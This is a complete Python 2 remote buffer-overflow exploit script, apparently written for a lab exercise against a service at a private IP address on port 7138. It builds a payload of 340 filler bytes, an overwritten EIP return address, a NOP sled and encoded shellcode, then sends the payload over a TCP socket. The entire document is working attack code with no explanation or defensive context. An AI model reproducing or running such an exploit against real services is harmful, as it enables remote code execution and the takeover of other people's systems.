#!/usr/bin/python
import socket

try:
 print "\nSending evil buffer..."
 shellcode = ( "\xd9\xc7\xbe\x4b\xc1\xff\xef\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
 "\x12\x31\x75\x17\x03\x75\x17\x83\xa6\x3d\x1d\x1a\x09\x65\x15"
 "\x06\x3a\xda\x89\xa3\xbe\x55\xcc\x84\xd8\xa8\x8f\x76\x7d\x83"
 "\xaf\xb5\xfd\xaa\xb6\xbc\x95\xec\xe1\x0e\x21\x85\xf3\x70\xa1"
 "\x1c\x7d\x91\x01\xf8\x2d\x03\x32\xb6\xcd\x2a\x55\x75\x51\x7e"
 "\xfd\xe8\x7d\x0c\x95\x9c\xae\xdd\x07\x34\x38\xc2\x95\x95\xb3"
 "\xe4\xa9\x11\x09\x66" )



 filler = "A" * 340
 eip = "\x03\x15\x10\x41"
 nops = "\x90" * 8
 
 inputBuffer = filler + eip + nops + shellcode
 
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.68.129", 7138))
 
 s.send(inputBuffer + '\r\n')
 print "\nDone!"
except:
 print "\nCould not connect!"

